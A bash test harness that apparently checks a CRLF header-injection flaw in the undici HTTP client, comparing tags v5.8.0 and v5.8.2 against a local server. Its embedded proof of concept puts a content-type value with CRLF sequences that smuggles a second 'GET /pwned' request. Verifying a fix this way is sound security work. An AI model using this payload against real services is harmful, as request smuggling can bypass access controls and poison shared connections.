#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")" && pwd)"
REPO="$ROOT/repo"

function run_one() {
  local tag="$1"
  echo "\n=== Testing $tag ==="

  rm -rf "$ROOT/tmp-$tag"
  mkdir -p "$ROOT/tmp-$tag"

  pushd "$REPO" >/dev/null
  git checkout -q "$tag"
  # install deps for this tag
  npm install --silent
  popd >/dev/null

  # Start server
  node "$ROOT/server.js" >"$ROOT/server-$tag.log" 2>&1 &
  SERVER_PID=$!
  trap 'kill "$SERVER_PID" 2>/dev/null || true' EXIT

  # wait for server
  for i in {1..50}; do
    if curl -s "http://127.0.0.1:3000/__status" >/dev/null; then
      break
    fi
    sleep 0.1
  done

  # run PoC using the checked-out undici (local package)
  pushd "$ROOT" >/dev/null
  ROOT="$ROOT" REPO="$REPO" node --input-type=module - <<'NODE'
import path from 'path';
import { pathToFileURL } from 'url';

const repo = process.env.REPO;

// Import undici directly from the checked-out repo (no publish/install needed)
const undiciEntry = pathToFileURL(path.join(repo, 'index.js')).href;
const { request } = await import(undiciEntry);

const unsanitizedContentTypeInput = 'application/json\r\n\r\nGET /pwned HTTP/1.1\r\nHost: 127.0.0.1:3000\r\n\r\n';

try {
  await request('http://127.0.0.1:3000/', {
    method: 'GET',
    headers: { 'content-type': unsanitizedContentTypeInput },
  });
  console.log('poc: request completed');
} catch (e) {
  console.log('poc: threw', e?.name || 'Error', e?.message || String(e));
}
NODE
  popd >/dev/null

  # Query server for number of requests
  local n
  n=$(curl -s "http://127.0.0.1:3000/__status" | node -p 'JSON.parse(require("fs").readFileSync(0,"utf8")).n')
  echo "server observed requests: $n"

  kill "$SERVER_PID" 2>/dev/null || true
  trap - EXIT

  echo "$tag\t$n" >> "$ROOT/results.tsv"
}

: > "$ROOT/results.tsv"
run_one "v5.8.0"
run_one "v5.8.2"

echo "\nResults:" 
cat "$ROOT/results.tsv"
